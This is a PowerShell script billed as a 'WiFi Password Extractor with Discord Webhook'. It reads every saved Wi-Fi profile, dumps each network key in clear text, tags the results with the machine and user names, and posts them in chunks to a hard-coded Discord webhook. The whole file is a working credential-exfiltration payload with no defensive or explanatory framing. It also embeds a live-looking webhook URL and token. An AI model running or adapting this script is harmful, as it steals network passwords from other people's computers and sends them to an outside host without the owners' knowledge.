# ============================================
# WiFi Password Extractor with Discord Webhook
# ============================================

$WebhookUrl = "https://discord.com/api/webhooks/1526592454168416286/85IrB-28a1gF4qRZOceA2tQNWpPEHa7KmBLUMSPVC0VENE6W7P1jsENuvZoepNtkARJB"

function Get-WifiPasswords {
    $wifiData = @()
    
    $profiles = netsh wlan show profiles | Select-String "All User Profile\s+:\s(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    
    foreach ($profile in $profiles) {
        $profileInfo = netsh wlan show profile name="$profile" key=clear
        $password = ($profileInfo | Select-String "Key Content\s+:\s(.+)$") | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
        
        if (-not $password) { $password = "[No Password/Open Network]" }
        
        $wifiData += [PSCustomObject]@{
            SSID = $profile
            Password = $password
        }
    }
    
    return $wifiData
}

function Send-DiscordMessage {
    param([string]$Message, [string]$Webhook)
    
    $payload = @{ content = $Message; username = "WiFi-Scanner" } | ConvertTo-Json -Compress
    
    try {
        Invoke-RestMethod -Uri $Webhook -Method Post -ContentType "application/json" -Body $payload
        Start-Sleep -Milliseconds 500
    }
    catch {
        Write-Error "Failed to send: $_"
    }
}

# ============ MAIN ============

$networks = Get-WifiPasswords

if ($networks.Count -eq 0) {
    Send-DiscordMessage -Message "No saved WiFi networks found." -Webhook $WebhookUrl
    exit
}

# Build message with proper escaping
$lines = @()
$lines += ":satellite: **WiFi Networks - $env:COMPUTERNAME**"
$lines += "User: $env:USERNAME | Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$lines += "========================================"

foreach ($net in $networks) {
    $lines += "SSID: $($net.SSID)"
    $lines += "PASS: $($net.Password)"
    $lines += "--------------------------------------"
}

# Discord code block wrapper
$codeBlockStart = '```'
$codeBlockEnd = '```'

# Chunk messages (1900 char limit buffer)
$currentChunk = ""
$chunks = @()

for ($i = 0; $i -lt $lines.Count; $i++) {
    $testLength = $currentChunk.Length + $lines[$i].Length + 2
    
    if ($testLength -gt 1900) {
        $chunks += $currentChunk
        $currentChunk = $lines[$i]
    } else {
        if ($currentChunk -ne "") { $currentChunk += "`n" }
        $currentChunk += $lines[$i]
    }
}
if ($currentChunk) { $chunks += $currentChunk }

# Send messages
if ($chunks.Count -eq 1) {
    $fullMsg = "$codeBlockStart`n$($chunks[0])`n$codeBlockEnd"
    Send-DiscordMessage -Message $fullMsg -Webhook $WebhookUrl
} else {
    Send-DiscordMessage -Message ":satellite: **WiFi Report Part 1/$($chunks.Count)** - $env:COMPUTERNAME" -Webhook $WebhookUrl
    
    for ($i = 0; $i -lt $chunks.Count; $i++) {
        $msg = "$codeBlockStart`n$($chunks[$i])`n$codeBlockEnd"
        Send-DiscordMessage -Message $msg -Webhook $WebhookUrl
    }
    
    Send-DiscordMessage -Message ":white_check_mark: **Complete** - $($networks.Count) networks reported" -Webhook $WebhookUrl
}

Write-Host "WiFi data sent successfully."
